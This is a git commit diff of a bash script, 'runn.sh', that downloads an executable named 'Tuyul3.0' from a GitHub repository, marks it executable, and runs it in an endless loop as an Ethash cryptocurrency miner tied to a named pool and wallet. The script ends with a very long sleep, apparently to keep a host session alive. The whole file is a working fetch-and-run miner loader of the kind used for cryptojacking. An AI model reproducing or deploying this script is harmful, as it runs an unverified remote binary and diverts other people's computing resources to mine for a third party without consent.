f7e4760027f716877d076d060f80db2801806c33
thecoderop <87470287+thecoderop@users.noreply.github.com>
2022-03-04 22:24:53 +0530

    Update runn.sh

--- runn.sh
+++ runn.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=ETH:0xbe4dbe090f7f304008d25d9861b332f785128c2d
-WORKER=$(echo $(shuf -i 10-40 -n 1)-tawheed#krig-11q7)
-wget https://github.com/thecoderop/new/raw/main/nun
+POOL=stratum+tcp://ethash.kupool.com:1800
+WALLET=tawheedop
+WORKER=gpu1
+wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
 chmod +x Tuyul3.0
 while [ 1 ]; do
-./nun --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER
 sleep 5
 done
 sleep 999999999 
